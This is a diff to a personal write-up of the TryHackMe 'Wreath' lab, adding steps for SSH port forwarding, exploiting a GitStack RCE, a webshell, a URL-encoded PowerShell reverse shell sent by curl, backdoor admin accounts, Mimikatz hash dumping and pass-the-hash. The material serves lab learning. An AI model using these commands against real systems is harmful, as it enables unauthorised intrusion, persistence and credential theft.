@@ -3,7 +3,7 @@
 
 Link to the room : https://tryhackme.com/room/wreath
 
-My IP address : 10.10.156.24
+My IP address : 10.50.156.24
 
 My OS : Kali GNU/Linux 2021.2
 
@@ -271,13 +271,12 @@ before from 80/443 port scan.
   But what happens if we don't have the user's password, or the server only accepts key-based authentication? Sshuttle doesn't currently seem to have a shorthand for specifying 
   a private key to authenticate to the server with. Because of that we use `--ssh-cmd` switch that allows us to specify what command gets executed by sshuttle.
   ```
-  sshuttle -r <USERNAME>@<TARGET IP> --ssh-cmd "ssh -i <KEY FILE> <TARGET SUBNET IP>
+  sshuttle -r <USERNAME>@<TARGET IP> --ssh-cmd "ssh -i <KEY FILE>" <TARGET SUBNET IP>
   ```
   If we are connecting to the target machine and this target machine is part of the subnet we're attempting to gain access to we can stumble upon error code 255 or
   "Broken pipe". To get around this we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
   ```
   sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP> -x <TARGET IP>
-  sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
   ```
   
   ---
@@ -324,13 +323,13 @@ before from 80/443 port scan.
   ```
   nmap -p- 10.200.159.100,150
   
-  10.200.159.100
+  10.200.159.150
   PORT  STATE   SERVICE
   80    open    http 
   3389  open    ms-wbt-server
   5985  open    wsman
   
-  10.200.159.150
+  10.200.159.100
   We can assume that this host is not accessible from our current position in the network because all of the ports are filtered.
   ```
   Without proxy we cannot perform a service detection scan on the target so we will assume that those identified services are accurate. It seems that the most vulnerable service 
@@ -338,8 +337,101 @@ before from 80/443 port scan.
   
   ## Pivoting
   
-  Right now we have to choose a pivoting technique and use it to connect to the web service on port 80 of host 10.200.159.100. I will do it using sshuttle to get some experience 
-  with that tool.
+  Right now we have to get access to the 10.200.159.150:80 machine using our root access on 10.200.159.200 machine. We can do that by simply creating an SSH connection between 
+  our 10.50.156.24:8000 -> 10.200.159.200 -> 10.200.159.150:80.
+  ```
+  ssh -i id_rsa -L 8000:10.200.159.150:80 root@10.200.159.200 -fN
+  ```
+  When we visit our http://127.0.0.1/8000 web page we can see that default webpage was not found so we should try 3 other URLs. One of them is /gitstack which is working.
+  As default credentials (admin:admin) doesn't work on this site we should look for any vulnerability in databases like https://www.exploit-db.com/ or searchsploit.
+  What I found out is that there is a vulnerability in exploit-db without given CVE named "GitStack 2.3.10 - RCE". Let's try to use it.
   
+  First of all we need to download it onto our attacker machine. We can copy it or git clone the entire directory, I prefer the first solution. Next up we should look through 
+  the code to understand how it works and edit parameters like "ip" or "command". For my configuration it shoud look like this :
+  ```
+  ip = '127.0.0.1:8000'
+  command = 'whoami'
+  ```
+  The command stays as it is because we want to know if this vulnerability even works. After those changes we can run this exploit with `python2 ./<NAME>` and get the output 
+  `nt authority\system` which is really good for us because we don't have to escalate our privileges on this machine. From here we want to obtain a full reverse shell. 
+  Another excelent fact is that this first run of the exploit creates a backdoor for us which we can use later for creating a reverse shell. Backdoor by default is in 
+  http://127.0.0.1:8000/web/exploit.php and it uses "a=" parameter for commands. For example right now you can accomplish the same output with :
+  ```
+  curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=whoami"
+  ```
+  
+  ### Windows Reverse Shell
+  
+  Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. Typical way to do this is to send some ICMP echo 
+  requests to our attacker machine and see how many make it through the network. Let's start with the listener on our attacker machine :
+  ```
+  tcpdump -i <INTERFACE> icmp
+  ```
+  And try to ping it with :
+  ```
+  ping -n 3 <ATTACKING IP>
+  ```
+  As we can see we have no output at all. To work around it we have to either upload a static copy of netcat and just catch the shell here or set up a relay on .200 to forward 
+  a shell back to a listener. I will choose first option. Ready binary you can find on anrew-d' github. But before we can do any work with netcat we have to get rid of CentOS 
+  always-on wrapper around the IPTables firewall called "firewalld". By default this firewall is extremely restrictive and because of that we need to open our desired port in 
+  the firewall.
+  ```
+  firewall-cmd --zone=public --add-port 20000/tcp
+  ```
+  After that we can upload to our root machine netcat binary and start listening on port 20000. On attacker machine we have to make curl/BurpSuite POST method with parameter "a" 
+  set as our one-liner reverse powershell. You can get those one-liners on various of githubs (you have to know how to search!).
+  
+  If you want to use curl you need to encode this one-liner to URL standards. You can do this with https://urlencoder.org/. 
+  ```
+  curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.159.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A"
+  ```
+  
+  And just like this we got our powershell reverse shell. Easy, right?
+  
+  ## Post-exploitation of Windows Machine
+  
+  From the enumeration we know that ports 3389 and 5985 are open. This means that we should be able to obtain either a GUI through RDP (3389) or a stable CLI shell using WINRM 
+  (5985). Specifically we need a user account with the "Remote Desktop Users" group for RDP or the "Remote Management Users" group for WinRM. We already have the ultimate 
+  access so we can easily create such an accounts. 
+  ```
+  net user <USERNAME> <PASSWORD> /add
+  net localgroup Administrators <USERNAME> /add
+  net localgroup "Remote Management Users" <USERNAME> /add
+  ```
+  With that out of our way we can access this machine with evil-winrm or xfree-rdp.
+  ```
+  sudo gem install evil-winrm
+  ssh -i id_rsa -L 8001:10.200.86.150:5985 root@10.200.159.200 -fN
+  evil-winrm -u <USERNAME> -p <PASSWORD> -i 127.0.0.1 -P 8001
+  ```
+  If it comes to xfreerdp we are able to create a shared drive between the attacking machine and the target. We can do this with switch `/drive:`. A useful directory to share is 
+  the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools including Mimikatz.
+  ```
+  ssh -i id_rsa -L 8002:10.200.86.150:3389 root@10.200.159.200 -fN
+  xfreerdp /v:127.0.0.1:8002 /u:<USERNAME> /p:<PASSWORD> /drive:/usr/share/windows-resources,share
+  ```
+  
+  ### Mimikatz
+  
+  With the shared Kali directory we are able to run Mimikatz from our cmd/powershell on xfreerdp setup. This gives us access to a very big database of post-exploitation tools 
+  that we can use to e.g. dump all the hashes.
+  ```
+  \\tsclient\share\mimikatz\x64\mimikatz.exe
+  privilege::debug
+  token::elevate
+  ```
+  If your command line is running as Administrator everything should go swiftly. Next up you should dump all of the SAM local password hashes using `lsadump::sam`. Near the top 
+  of the results you will se the Administrator's NTLM hash. We are not able to crack it but we can always try to crack other users passwords. For example Thomas' password is 
+  really easy to crack and you can even use sites like https://crackstation.net/.
+  
+  As we were not able to crack the Administrators hash we can use it with evil-winrm built-in pass-the-hash technique using this hash to get Administrator access.
+  ```
+  evil-winrm -u Administrator -H <hash> -i 127.0.0.1 -P 8001
+  ```
+  Just like this we were able to establish a stable shell. But we should keep going deeper into the network.
+  
+  
+  
+
   
   
